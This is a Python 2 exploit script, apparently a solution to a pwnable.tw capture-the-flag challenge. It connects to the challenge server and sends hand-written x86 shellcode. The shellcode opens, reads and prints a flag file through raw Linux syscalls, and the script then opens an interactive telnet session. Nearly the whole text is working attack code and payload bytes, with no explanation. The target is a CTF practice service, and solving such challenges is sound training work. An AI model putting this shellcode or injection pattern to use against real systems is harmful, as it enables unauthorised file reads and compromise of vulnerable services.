from socket import *
from struct import *
from time import *
import telnetlib

ip='chall.pwnable.tw'
port=10001

#ip='127.0.0.1'
#port=1129

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))

t=telnetlib.Telnet()
t.sock=s

shellcode=''


shellcode="\x31\xdb\x31\xc9\x31\xd2\x31\xc0\xba\x00\x00\x00\x00"
shellcode+="\xb9\x00\x00\x00\x00\x50\x68\x66\x6c"
shellcode+="\x61\x67\x68\x6f\x72\x77\x2f\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f"
shellcode+="\x68\x8b\xdc\xb0\x05\xcd\x80\xb2\x64\x8b\xcc\x8b\xd8\xb0\x03\xcd"
shellcode+="\x80\x8b\xcc\xb2\x64\xb3\x01\xb0\x04\xcd\x80"
shellcode+="\x31\xc0\x40\xcd\x80"

def recvuntil(s,c):
        data=''
        while c not in data:
                data+=s.recv(1)
        return data

print recvuntil(s,':')

s.send(shellcode)

print s.recv(100)
t.interact()
s.close()


